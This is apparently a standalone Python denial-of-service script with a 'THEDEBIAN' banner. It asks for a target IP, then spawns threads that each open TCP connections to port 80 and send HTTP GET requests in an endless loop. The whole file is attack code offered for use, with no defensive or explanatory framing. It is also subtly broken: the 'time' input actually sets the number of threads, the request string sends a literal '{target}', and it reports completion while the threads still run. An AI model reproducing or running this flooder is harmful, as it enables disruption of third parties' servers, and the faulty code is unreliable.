import os
import socket
import threading
import sys




os.system('clear || cls')
sys.ps1 = '\033[01;32m '
print(sys.ps1)

print('''

████████╗██╗  ██╗███████╗██████╗ ███████╗██████╗ ██╗ █████╗ ███╗   ██╗
╚══██╔══╝██║  ██║██╔════╝██╔══██╗██╔════╝██╔══██╗██║██╔══██╗████╗  ██║
   ██║   ███████║█████╗  ██║  ██║█████╗  ██████╔╝██║███████║██╔██╗ ██║
   ██║   ██╔══██║██╔══╝  ██║  ██║██╔══╝  ██╔══██╗██║██╔══██║██║╚██╗██║
   ██║   ██║  ██║███████╗██████╔╝███████╗██████╔╝██║██║  ██║██║ ╚████║
   ╚═╝   ╚═╝  ╚═╝╚══════╝╚═════╝ ╚══════╝╚═════╝ ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝
                                                                      

                                  
                                                                        
''')

target = input("Enter the IP of the Target: ")
thr = input("Time (seconds): ")
port = 80

def attack():
    while True:
        lol = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        lol.connect((target, port))
        lol.sendto(("GET /{target} HTTP/1.1\r\n").encode("ascii"), (target, port))
        lol.close()
print("Attack started on "+target)
    
for i in range(int(thr)):
    thread1 = threading.Thread(target=attack)
    thread1.start()

print("attack time completed")
